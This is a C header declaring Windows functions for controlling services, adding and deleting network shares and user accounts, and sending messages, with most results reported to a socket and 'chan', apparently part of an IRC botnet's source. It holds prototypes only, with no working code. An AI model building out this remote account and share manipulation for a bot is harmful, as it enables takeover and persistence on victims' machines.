#ifndef NO_NET
enum {NET_ADD, NET_DELETE, NET_INFO, NET_START, NET_STOP, NET_PAUSE, NET_CONTINUE};

#define IsVSD(x) ((x)?("Yes"):("No"))

typedef struct NetCommand
{
	char *action;
	char *completed;
	DWORD control;
	
} NetCommand;

char *Services(int action, char *ServiceName);
DWORD ServiceControl(int option, char *ServiceName, DWORD dwControl=0, DWORD nArg=0, LPCTSTR *pArg=NULL); 
static char *ServiceError(DWORD svcError);
bool ListServices(SOCKET sock, char *chan, bool notice);
char *Shares(int action, char *ShareName, char *SharePath=NULL);
static char *AsWideString(const char *cszANSIstring);
char *AsAnsiString(const WCHAR *cszWIDEstring);
NET_API_STATUS ShareAdd(char *ServerName, char *ShareName, char *SharePath);
NET_API_STATUS ShareDel(char *ServerName, char *ShareName);
bool ListShares(SOCKET sock, char *chan, bool notice, char *ServerName=NULL);
char *Users(int action, char *Username, char *Password, SOCKET sock, char *chan, bool notice);
NET_API_STATUS UserAdd(char *ServerName, char *Username, char *Password);
NET_API_STATUS UserDel(char *ServerName, char *Username);
NET_API_STATUS UserInfo(char *ServerName, char *Username, SOCKET sock, char *chan, bool notice);
bool ListUsers(SOCKET sock, char *chan, bool noice, char *ServerName=NULL);
static char *NasError(NET_API_STATUS nStatus);
char *NetSend(char *msg, SOCKET sock, char *chan, bool notice);
#endif
